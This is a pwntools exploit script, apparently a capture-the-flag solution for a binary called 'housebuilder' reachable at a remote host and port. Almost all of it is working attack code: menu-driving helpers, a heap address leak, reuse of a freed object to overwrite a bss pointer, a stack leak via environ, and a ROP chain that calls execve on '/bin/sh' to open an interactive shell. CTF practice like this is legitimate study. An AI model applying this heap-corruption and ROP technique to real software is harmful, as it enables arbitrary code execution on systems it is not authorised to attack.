from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './housebuilder'
HOST = '151.236.114.211'
PORT = 17174

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def a():
	r.sendlineafter('A', 'A')

r = start()
if args.D:
	debug(r, [0x4ea0])

def create(name='AAAA', room=1, floor=2, people=3):
	r.sendlineafter('> ', '1')
	r.sendlineafter(': ', name)
	r.sendlineafter(': ', str(room))
	r.sendlineafter(': ', str(floor))
	r.sendlineafter(': ', str(people))

def enter(idx):
	r.sendlineafter('> ', '2')
	r.sendlineafter(': ', str(idx))
def out():
	r.sendlineafter('> ', '4')

def show():
	r.sendlineafter('> ', '3')

def delete(idx):
	r.sendlineafter('> ', '4')
	r.sendlineafter(': ', str(idx))

def in_view():
	r.sendlineafter('> ', '1')

def in_edit(data):
	r.sendlineafter('> ', '2')
	r.sendlineafter(': ', data)

def in_sell():
	r.sendlineafter('> ', '3')
bss_current = 0x5d68e0
environ = 0x5da448


create() # 0
enter(0)
in_sell()
in_view()
r.recvuntil('Floors: ')
leak = int(r.recvuntil('\n', True))
dbg('leak')
heap = leak - 0x1210
dbg('heap')
tps = leak - 0x10 # in case we use this.
dbg('tps')
current = heap + 0x14d50
dbg('current')
out()

create('A'*8) # 0
create('B'*8) # 1

enter(1)
in_sell()
out()

enter(0)
in_sell()
in_edit(p64(bss_current))
out()

create() # 2
create('A') # 0

enter(0)
payload = ''
payload += flat(bss_current+0x8, 1, 2, 3, environ, 0x8, 0x8, 0, bss_current+8)
in_edit(payload)
in_view()
r.recvuntil('Name: ')
leak = u64(r.recvuntil('\n', True))
dbg('leak')
stack = leak - 0x140
dbg('stack')
payload = ''
payload += flat(1, 2, 3, environ, 0x8, 0x8, 0, stack)
payload += '/bin/sh\x00'
in_edit(payload)
rax = 0x0054be4b
rdx = 0x004044cf
rsi = 0x005739e7
rdi = 0x00572b7d
syscall = 0x00569cd9

bss = 0x5d64e0
payload = ''
payload += flat(rax, 0x3b, rdi, bss_current+0x48, rsi, 0, rdx, 0, syscall)

in_edit(payload)
out()
r.sendlineafter('> ', '5')



r.interactive()
r.close()
